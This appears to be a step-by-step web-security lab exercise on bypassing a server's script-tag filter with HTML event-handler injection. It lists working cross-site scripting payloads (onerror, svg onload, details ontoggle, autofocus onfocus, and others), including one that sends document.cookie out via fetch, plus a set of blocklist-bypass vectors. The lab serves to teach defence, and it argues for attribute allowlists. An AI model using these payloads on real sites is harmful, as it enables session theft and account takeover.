Attack 02 — Event Handler Injection (Mechanism 2)

Module 05 · Work through each section in order. The goal: fire JavaScript execution on a server that blocks <script> tags. Keep DevTools Console open throughout.

⚠ The lab server endpoints are intentionally vulnerable. All payloads execute real JavaScript in your browser's session context.
STEP 1

Prove the Script Filter Exists

First, confirm the server's /vuln-display endpoint strips <script> tags.

<script>alert(document.domain)</script>
The page shows the input, the filtered version (script tag removed), and the rendered output. The alert does NOT fire. The filter works for this one vector. Now watch every subsequent step bypass it.
STEP 2

onerror — Zero Interaction Bypasszero interaction

No <script> tag. No user action. The filter sees nothing dangerous. The browser fires onerror when the image src fails to load. 

<img src=x onerror=alert(document.domain)>
✓ Filter bypass confirmed: no <script> tag present. Alert fires on page load.
<img src=x onerror="fetch('/ping?c='+document.cookie)">
The exfiltration demo sends cookies to /ping (your own server). Watch the Network panel — you'll see the /ping?c=... request. In a real attack this URL points to the attacker's server.
STEP 3

innerHTML — Event Handlers Fire, Script Tags Don'tzero interaction

Confirm the innerHTML asymmetry directly in this page. The two buttons below inject into the same output box — only one fires. 

<script>alert('innerHTML script')</script>
Waiting for injection…
<img src=x onerror=document.getElementById('r3b').textContent='onerror via innerHTML — FIRED'>
Waiting for injection…
The script tag injection produces a DOM node but no execution. The onerror injection fires immediately. This is the HTML5 spec in action — and the reason every DOM XSS payload uses event handlers, not script tags.
STEP 4

SVG onload — Inline SVG Executionzero interaction

SVG is valid HTML5. An inline <svg> with an onload attribute fires immediately when parsed — even via innerHTML in this case. 

<svg onload=alert(document.domain)>
Waiting…
<svg onload=alert(document.domain)>
Via the server: the filter sees no <script> tag. SVG passes through. onload fires on the SVG element immediately. This is why SVG upload is studied separately in Module 07.
STEP 5

<details> ontoggle — Fires at Parse Timezero interaction

The open attribute on a <details> element causes an immediate toggle event at parse time. No user action. Works via innerHTML. Rarely in blocklists. 

<details open ontoggle=alert(document.domain)>
Waiting…
<details open ontoggle=alert(document.domain)>
The /filter-demo endpoint blocks onerror and onload but not ontoggle. The payload passes through. This is the long-tail problem — you cannot enumerate every event handler.
STEP 6

autofocus + onfocus — Zero-Interaction Input Hijackzero interaction

autofocus makes the browser focus the element immediately on load, triggering onfocus. Works from a server-side attribute injection where angle brackets are blocked. 

<input autofocus onfocus=alert(document.domain)>
Waiting…
Especially powerful in attribute-context injection: " autofocus onfocus="alert(1) — no angle brackets needed. Covered in Module 04 Step 5.
STEP 7

The Long Tail — Bypass the /filter-demo Blocklist

The /filter-demo endpoint blocks: <script, javascript:, onerror, onload, onclick. Every payload below bypasses all five rules. 

<details open ontoggle=alert(document.domain)>
<svg onmouseover=alert(document.domain)>hover</svg>
<input autofocus onfocus=alert(document.domain)>
<div onmousemove=alert(document.domain) style="padding:40px">move mouse here</div>
<body onpaste=alert(document.domain)><textarea>paste here</textarea>
<style>@keyframes x{}</style><div style="animation:x" onanimationstart=alert(1)>
Each of these uses an event not in the blocklist. A correct defence uses an allowlist of permitted attributes — not a blocklist of forbidden ones. The Event Catalog shows 40+ vectors; no blocklist can ever be complete.
